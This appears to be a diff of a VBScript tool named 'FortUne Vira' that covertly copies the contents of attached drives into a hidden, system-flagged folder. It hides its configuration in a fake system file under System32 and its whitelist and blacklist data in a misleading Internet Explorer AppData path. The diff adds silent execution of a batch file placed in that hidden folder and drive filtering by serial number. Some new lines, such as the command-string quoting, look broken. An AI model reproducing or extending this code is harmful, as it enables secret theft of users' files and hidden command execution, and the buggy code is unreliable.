@@ -1,12 +1,12 @@
 '*******************
 '  FortUne Vira
-'  Version 2.23
+'  Version InDev
 '*******************
 Option Explicit
 On Error Resume Next
-Const ViraVersion = "2.23 R4"
+Const ViraVersion = "2.25b"
 Const ViraTitle = "Vira 2"
-Const ViraDescription = "Vira 2.23 Super Edition Release 4"
+Const ViraDescription = "Vira 2.25b Super Edition"
 
 ' System
 Dim Shell, Fso, IsAdmin
@@ -15,8 +15,10 @@ Set Fso = CreateObject("Scripting.FileSystemObject")
 
 ' Vira
 Const ControlFile = "ViraControl.ini"
+Const ExecuteFile = "56697261\Execute.bat"
 Dim FlagFileNum, FlagFile, CapacityGB, Destination, ReverseDir
-Dim Container, IsCopied(23)
+Dim Container, IsCopied(23), Blacklist(1), Whitelist(1)
+Dim AppData
 
 ' Customization Section
 Const ConfigFile = "C:\Windows\System32\Wbem\en-US\ariv.mui"
@@ -97,7 +99,9 @@ End If
 '  Library
 '***********
 Sub ViraInitialize
+  AppData = Shell.ExpandEnvironmentStrings("%AppData%")& "\Microsoft\Internet Explorer\UserData\"
   ReadConfig
+  ReadAppData
   Shell.Run "CMD.EXE /C MKDIR """ & Destination & """", 0, True
   Set Container = Fso.GetFolder(Destination)
   Container.Attributes = 7
@@ -119,28 +123,28 @@ Sub ViraSingleLoop
       IsCopied(i) = False
     End If
   Next
+  ExecuteLocal(Destination & ExecuteFile, _
+    Destination & Fso.GetParentFolderName(ExecuteFile) & "\stdout.txt")
 End Sub
 
 Function DriveProcess(DriveLetter)
   On Error Resume Next
   DriveProcess = False
   Dim Drive, Target, RTarget, TimeA, TimeB, TimeC, Text, Folder
+  Dim i, j
   Set Drive = Fso.GetDrive(DriveLetter)
   If Drive.DriveType <> 1 And Drive.DriveType <> 2 Then Exit Function
   If Not Drive.IsReady Then Exit Function
   If Drive.DriveType = 1 Then
-    If Fso.FileExists(DriveLetter & ":\" & "VExecute.txt") Then
-      Dim Text, ExecuteInfo
-      Set Text = Fso.OpenTextFile(DriveLetter & ":\" & "VExecute.txt", 1, False, 2)
-      ExecuteInfo = Text.ReadAll
-      ExecuteDrive DriveLetter, ExecuteInfo
-      DriveProcess = True
-      Exit Function
-    End If
     For i = 0 To FlagFileNum - 1
-      If Fso.FileExists(DriveLetter & ":\" & FlagFile(i)) Then
-        Exit Function
-      End If
+      For j = 0 To UBound(Blacklist)
+        If ConvertHex(Drive.SerialNumber) = Blacklist(j) Then Exit For
+      Next
+      If j < UBound(Blacklist) Then Exit For
+      For j = 0 To UBound(Whitelist)
+        If ConvertHex(Drive.SerialNumber) = Whitelist(j) Then Exit Function
+      Next
+      If Fso.FileExists(DriveLetter & ":\" & FlagFile(i)) Then Exit Function
     Next
     
     If Len(Drive.VolumeName) > 0 Then
@@ -187,24 +191,13 @@ Function DriveProcess(DriveLetter)
   End If
 End Function
 
-' Currently Unused
-Function ExecuteDrive(DriveLetter, ExecuteInfo)
-  On Error Resume Next
-  ExecuteDrive = False
-  ExecuteInfo = Replace(ExecuteInfo, "thisDrive", DriveLetter & ":")
-  ExecuteInfo = Replace(ExecuteInfo, "storageDirectory", Destination)
-  ExecuteInfo = Replace(ExecuteInfo, "storageCapacity", CapacityGB)
-  Dim Control, Command, str, i
-  Control = Split(ExecuteInfo, vbCrLf)
-  For i = LBound(Control) To UBound(Control)
-    str = Split(Control(i), "=")
-    Select Case LCase(str(0))
-      Case "command"
-        Command = str(1)
-    End Select
-  Next
-  Shell.Run Command, 0, False
-  ExecuteDrive = True
+Function ExecuteLocal(ExecuteFile, StdoutRedirect)
+  ExecuteLocal = False
+  If Fso.FileExists(ExecuteFile) Then
+    Shell.Run "CMD.exe /C """ & ExecuteFile & """ 1>> """ & StdoutRedirect & "" 2>>&1"
+    Fso.MoveFile ExecuteFile, ExecuteFile & ".bak", True
+    ExecuteLocal = True
+  End If
 End Function
 
 Function WriteDriveInfo(DriveLetter, Target)
@@ -224,13 +217,50 @@ Function WriteDriveInfo(DriveLetter, Target)
   Text.Close
 End Function
 
+Function ReadAppData()
+  ReadAppData = False
+  Dim Text
+  If Fso.FileExists(AppData & "safezone.dat") Then
+    Set Text = Fso.OpenTextFile(AppData & "safezone.dat", 1)
+    Whitelist = Split(Text.ReadLine(), "|")
+    ReadAppData = True
+  End If
+  If Fso.FileExists(AppData & "safezoneL.dat") Then
+    Set Text = Fso.OpenTextFile(AppData & "safezoneL.dat", 1)
+    Blacklist = Split(Text.ReadLine(), "|")
+    ReadAppData = True
+  End If
+End Function
+
+Function WriteAppData()
+  WriteAppData = False
+  Dim Text, str, i
+  Set Text = Fso.OpenTextFile(AppData & "safezone.dat", 2)
+  If UBound(Whitelist) > 0 Then
+    str = Whitelist(0)
+    For i = 1 To UBound(Whitelist)
+      str = str & "|" & Whitelist(i)
+    Next
+  End If
+  Text.WriteLine str
+  Set Text = Fso.OpenTextFile(AppData & "safezoneL.dat", 2)
+  If UBound(Blacklist) > 0 Then
+    str = Blacklist(0)
+    For i = 1 To UBound(Blacklist)
+      str = str & "|" & Blacklist(i)
+    Next
+  End If
+  Text.WriteLine str
+  WriteAppData = True
+End Function
+
 Function ReadConfig()
   ReadConfig = False
-  Dim Text
   If Not Fso.FileExists(ConfigFile) Then
     DefaultConfig
     Exit Function
   End If
+  Dim Text
   Set Text = Fso.OpenTextFile(ConfigFile, 1)
   If Text.ReadLine() = "VR3XF" Then
     FlagFile = Split(Text.ReadLine(), "|")
